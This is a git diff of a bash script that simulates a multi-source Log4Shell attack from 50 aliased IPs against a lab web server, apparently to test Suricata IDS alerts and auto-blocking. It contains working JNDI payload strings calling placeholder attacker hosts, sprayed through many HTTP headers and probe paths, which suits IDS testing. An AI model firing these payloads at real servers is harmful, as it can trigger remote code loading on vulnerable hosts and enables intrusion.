@@ -1,8 +1,16 @@
 #!/usr/bin/env bash
 # =============================================================================
-#  attack_sim.sh — Simulasi Serangan Multi-IP untuk Menguji Suricata
+#  attack_sim.sh — Simulasi Serangan Multi-IP untuk Menguji Suricata IDS
 #  Author  : Levi (github.com/LEVI6957)
 #  Usage   : sudo bash attack_sim.sh
+#
+#  Script ini membuat 50 IP virtual di subnet yang sama dengan target,
+#  lalu mengirimkan HTTP request berisi payload Log4Shell (CVE-2021-44228)
+#  dari setiap IP. Setiap IP mengirim 5x request agar melewati threshold
+#  auto-block di dashboard SuricataEVE.
+#
+#  PENTING: Pastikan Suricata sudah memiliki ruleset ET (suricata-update)
+#           dan dummy_web (Apache) sudah berjalan di port 80.
 # =============================================================================
 
 # ── Warna ─────────────────────────────────────────────────────────────────────
@@ -16,37 +24,35 @@ TARGET="http://${TARGET_IP}:${TARGET_PORT}"
 
 # Deteksi interface jaringan utama secara otomatis
 IFACE=$(ip -o -4 route show to default | awk '{print $5}' | head -n1)
-if [[ -z "$IFACE" ]]; then
-    IFACE="eth0"
-fi
+[[ -z "$IFACE" ]] && IFACE="eth0"
 
-# Ambil IP address dari interface tersebut (IP asli Kali)
+# IP asli Kali Linux
 KALI_IP=$(ip -o -4 addr show dev "$IFACE" | awk '{print $4}' | cut -d/ -f1 | head -n1)
 
-# Gunakan subnet yang SAMA dengan target agar paket bisa dirouting otomatis
-# dan sampai ke web server tanpa routing tambahan.
+# Subnet SAMA dengan target — tidak perlu routing tambahan
 IP_BASE="192.168.216"
-
-# Range IP virtual yang akan dibuat
 IP_START=100
 IP_COUNT=50
-DELAY=0.1
+HITS_PER_IP=5       # Jumlah request per IP (harus > threshold auto-block)
+DELAY=0.05          # Delay antar IP (detik)
 
 # ── Fungsi Helper ─────────────────────────────────────────────────────────────
 info()    { echo -e "${GREEN}[INFO]${NC}  $*"; }
 warn()    { echo -e "${YELLOW}[WARN]${NC}  $*"; }
 attack()  { echo -e "${RED}[ATK]${NC}   $*"; }
-success() { echo -e "${CYAN}[OK]${NC}    $*"; }
-header()  { echo -e "\n${BOLD}${BLUE}══════════════════════════════════════════${NC}";
-            echo -e "${BOLD}${BLUE}  $*${NC}";
-            echo -e "${BOLD}${BLUE}══════════════════════════════════════════${NC}\n"; }
+success() { echo -e "${CYAN}[✓]${NC}    $*"; }
+fail()    { echo -e "${RED}[✗]${NC}    $*"; }
+header()  { echo -e "\n${BOLD}${BLUE}══════════════════════════════════════════════════════${NC}"
+            echo -e "${BOLD}${BLUE}  $*${NC}"
+            echo -e "${BOLD}${BLUE}══════════════════════════════════════════════════════${NC}\n"; }
 
-[[ $EUID -ne 0 ]] && echo -e "${RED}[ERROR]${NC} Jalankan dengan sudo: sudo bash attack_sim.sh" && exit 1
+# ── Root Check ────────────────────────────────────────────────────────────────
+[[ $EUID -ne 0 ]] && fail "Jalankan dengan sudo: sudo bash attack_sim.sh" && exit 1
 
+# ── Cleanup saat EXIT ─────────────────────────────────────────────────────────
 cleanup() {
     echo ""
-    warn "Membersihkan IP virtual..."
-    ip route del "${IP_BASE}.0/24" dev "$IFACE" 2>/dev/null || true
+    warn "Membersihkan ${IP_COUNT} IP virtual..."
     for i in $(seq $IP_START $((IP_START + IP_COUNT - 1))); do
         ip addr del "${IP_BASE}.${i}/24" dev "$IFACE" 2>/dev/null
     done
@@ -54,61 +60,173 @@ cleanup() {
 }
 trap cleanup EXIT
 
-header "🔥 SURICATA ATTACK SIMULATOR (50 IP)"
-echo -e "  Target    : ${BOLD}${TARGET}${NC}"
-echo -e "  Interface : ${BOLD}${IFACE}${NC}"
-echo -e "  IP Range  : ${BOLD}${IP_BASE}.${IP_START} - ${IP_BASE}.$((IP_START + IP_COUNT - 1))${NC}"
+# ── Banner ────────────────────────────────────────────────────────────────────
+header "🔥 SURICATA ATTACK SIMULATOR v2.0"
+echo -e "  Target     : ${BOLD}${TARGET}${NC}"
+echo -e "  Interface  : ${BOLD}${IFACE}${NC} (IP: ${KALI_IP})"
+echo -e "  Virtual IP : ${BOLD}${IP_BASE}.${IP_START} — ${IP_BASE}.$((IP_START + IP_COUNT - 1))${NC}"
+echo -e "  Request/IP : ${BOLD}${HITS_PER_IP}x${NC}"
+echo -e "  Total      : ${BOLD}$((IP_COUNT * HITS_PER_IP)) request${NC}"
 echo ""
+
+# ── Pre-Flight Check ──────────────────────────────────────────────────────────
+header "0. Pre-Flight Check"
+
+# Cek apakah target bisa di-ping
+if ping -c 1 -W 2 "$TARGET_IP" &>/dev/null; then
+    success "Target ${TARGET_IP} reachable (ping OK)"
+else
+    fail "Target ${TARGET_IP} tidak bisa di-ping!"
+    warn "Pastikan Ubuntu Server menyala dan IP benar."
+    exit 1
+fi
+
+# Cek apakah web server (port 80) menerima koneksi
+HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 "${TARGET}/")
+if [[ "$HTTP_CODE" != "000" ]]; then
+    success "Web server aktif di port ${TARGET_PORT} (HTTP ${HTTP_CODE})"
+else
+    fail "Web server TIDAK merespons di port ${TARGET_PORT}!"
+    warn "Pastikan container dummy_web sudah jalan:"
+    echo -e "  ${BOLD}docker compose up -d dummy_web${NC}"
+    exit 1
+fi
+
+# Cek apakah Suricata berjalan di server target (opsional)
+info "Cek Suricata di target... (pastikan sudah docker compose up -d suricata)"
+
 echo ""
-read -rp "$(echo -e ${YELLOW}[?]${NC}) Lanjut? (y/N): " confirm
+read -rp "$(echo -e ${YELLOW}[?]${NC}) Semua OK. Mulai serangan? (y/N): " confirm
 [[ "${confirm,,}" != "y" ]] && echo "Dibatalkan." && exit 0
 
-header "1. Membuat IP Virtual"
+# ── Langkah 1: Buat IP Virtual ────────────────────────────────────────────────
+header "1. Membuat ${IP_COUNT} IP Virtual"
+
 > attackers.txt
-info "Mencatat IP penyerang ke attackers.txt"
-
+CREATED=0
 for i in $(seq $IP_START $((IP_START + IP_COUNT - 1))); do
-    ip addr add "${IP_BASE}.${i}/24" dev "$IFACE" 2>/dev/null
-    echo "${IP_BASE}.${i}" >> attackers.txt
+    VIRT_IP="${IP_BASE}.${i}"
+    ip addr add "${VIRT_IP}/24" dev "$IFACE" 2>/dev/null
+    echo "$VIRT_IP" >> attackers.txt
+    CREATED=$((CREATED + 1))
 done
-success "50 IP virtual berhasil dibuat!"
-
-ip route add "${IP_BASE}.0/24" dev "$IFACE" 2>/dev/null || true
+success "${CREATED} IP virtual berhasil dibuat (${IP_BASE}.${IP_START} — ${IP_BASE}.$((IP_START + IP_COUNT - 1)))"
+info "Daftar IP disimpan ke attackers.txt"
 sleep 1
 
-header "2. Memulai Simulasi Serangan (3x Request / IP)"
+# ── Langkah 2: Kirim Serangan ─────────────────────────────────────────────────
+header "2. Memulai Simulasi Serangan (${HITS_PER_IP}x per IP)"
 
-HEADERS=("X-Api-Version" "User-Agent" "X-Forwarded-For" "Referer" "X-Client-IP" "X-Real-IP")
-PAYLOAD='${jndi:ldap://evil.levi.com/exploit}'
+# Variasi header HTTP untuk menyisipkan payload Log4Shell
+HEADERS=(
+    "User-Agent"
+    "X-Api-Version"
+    "X-Forwarded-For"
+    "Referer"
+    "X-Client-IP"
+    "X-Real-IP"
+    "Accept-Language"
+    "Authorization"
+    "X-Originating-IP"
+    "CF-Connecting-IP"
+)
 
+# Variasi payload Log4Shell — semua mengandung pattern ${jndi: yang dideteksi Suricata
+PAYLOADS=(
+    '${jndi:ldap://evil.levi.com/exploit}'
+    '${jndi:ldap://attacker.levi.com/a}'
+    '${jndi:rmi://malicious.levi.com/obj}'
+    '${jndi:dns://callback.levi.com}'
+    '${jndi:ldap://log4shell.levi.com/x}'
+)
+
+# Variasi URL path agar setiap request terlihat unik di log
+PATHS=(
+    "/"
+    "/index.php"
+    "/login"
+    "/admin"
+    "/api/v1/users"
+    "/search?q=test"
+    "/wp-login.php"
+    "/console"
+    "/.env"
+    "/actuator/health"
+)
+
+TOTAL_SENT=0
+TOTAL_OK=0
+TOTAL_BLOCKED=0
+
+echo ""
 for i in $(seq 0 $((IP_COUNT - 1))); do
     SRC_IP="${IP_BASE}.$((IP_START + i))"
-    HDR_IDX=$((i % ${#HEADERS[@]}))
-    HDR="${HEADERS[$HDR_IDX]}"
 
-    echo -ne "${RED}[ATK]${NC} Log4Shell dari ${BOLD}${SRC_IP}${NC} (Kirim 3x)...\r"
-    
-    # Kirim 3 request berurutan (tanpa background agar lebih terkontrol)
-    for hit in {1..3}; do
-        curl -s --max-time 2 --connect-timeout 2 \
+    # Pilih header dan payload berbeda untuk setiap IP
+    HDR="${HEADERS[$((i % ${#HEADERS[@]}))]}"
+    PLD="${PAYLOADS[$((i % ${#PAYLOADS[@]}))]}"
+
+    BLOCKED=false
+    for hit in $(seq 1 $HITS_PER_IP); do
+        PATH_TARGET="${PATHS[$(( (i + hit) % ${#PATHS[@]} ))]}"
+
+        HTTP_RESULT=$(curl -s --max-time 3 --connect-timeout 2 \
             --interface "$SRC_IP" \
-            -H "${HDR}: ${PAYLOAD}" \
-            "${TARGET}/" -o /dev/null 2>/dev/null
+            -H "${HDR}: ${PLD}" \
+            -o /dev/null -w "%{http_code}" \
+            "${TARGET}${PATH_TARGET}" 2>/dev/null)
+
+        TOTAL_SENT=$((TOTAL_SENT + 1))
+
+        if [[ "$HTTP_RESULT" == "000" ]]; then
+            BLOCKED=true
+            TOTAL_BLOCKED=$((TOTAL_BLOCKED + 1))
+            break
+        else
+            TOTAL_OK=$((TOTAL_OK + 1))
+        fi
     done
-    echo -e "${RED}[ATK]${NC} Log4Shell dari ${BOLD}${SRC_IP}${NC} (Kirim 3x) -> Selesai."
-    
+
+    if $BLOCKED; then
+        echo -e "${RED}[ATK]${NC} ${SRC_IP} → ${HITS_PER_IP}x ${HDR} → ${GREEN}DIBLOKIR! ✓${NC}"
+    else
+        echo -e "${RED}[ATK]${NC} ${SRC_IP} → ${HITS_PER_IP}x ${HDR} → selesai (HTTP ${HTTP_RESULT})"
+    fi
+
     sleep "$DELAY"
 done
 
+# ── Ringkasan ─────────────────────────────────────────────────────────────────
 header "✅ Simulasi Selesai!"
 
+echo -e "  ${BOLD}Total IP penyerang${NC}  : ${IP_COUNT}"
+echo -e "  ${BOLD}Total request${NC}       : ${TOTAL_SENT}"
+echo -e "  ${BOLD}Request berhasil${NC}    : ${TOTAL_OK}"
+echo -e "  ${BOLD}IP terblokir${NC}        : ${GREEN}${TOTAL_BLOCKED}${NC}"
+echo ""
+
+# Simpan metadata eksperimen
 info "Menyimpan attack_metadata.json..."
 cat <<EOF > attack_metadata.json
 {
   "test_date": "$(date -u +'%Y-%m-%dT%H:%M:%SZ')",
-  "attack_type": "Log4Shell via HTTP Headers (3x per IP)",
+  "attack_type": "Log4Shell CVE-2021-44228 via HTTP Headers",
   "total_attackers": ${IP_COUNT},
-  "target_ip": "${TARGET_IP}"
+  "hits_per_ip": ${HITS_PER_IP},
+  "total_requests": ${TOTAL_SENT},
+  "requests_ok": ${TOTAL_OK},
+  "ips_blocked": ${TOTAL_BLOCKED},
+  "target_ip": "${TARGET_IP}",
+  "target_port": "${TARGET_PORT}",
+  "headers_used": ["User-Agent","X-Api-Version","X-Forwarded-For","Referer","X-Client-IP","X-Real-IP","Accept-Language","Authorization","X-Originating-IP","CF-Connecting-IP"],
+  "payload_variants": 5,
+  "suricataeve_version": "1.0"
 }
 EOF
-success "Log tersimpan."
+success "Metadata eksperimen disimpan ke attack_metadata.json"
+
+echo ""
+echo -e "  ${GREEN}➜${NC} Buka Dashboard : ${BOLD}http://${TARGET_IP}:8080${NC}"
+echo -e "  ${GREEN}➜${NC} Cek log        : ${BOLD}tail -f ~/SuricataEVE/logs/eve.json${NC}"
+echo -e "  ${GREEN}➜${NC} Cek blocked    : ${BOLD}cat ~/SuricataEVE/auto_block/blocked_ips.log${NC}"
+echo ""
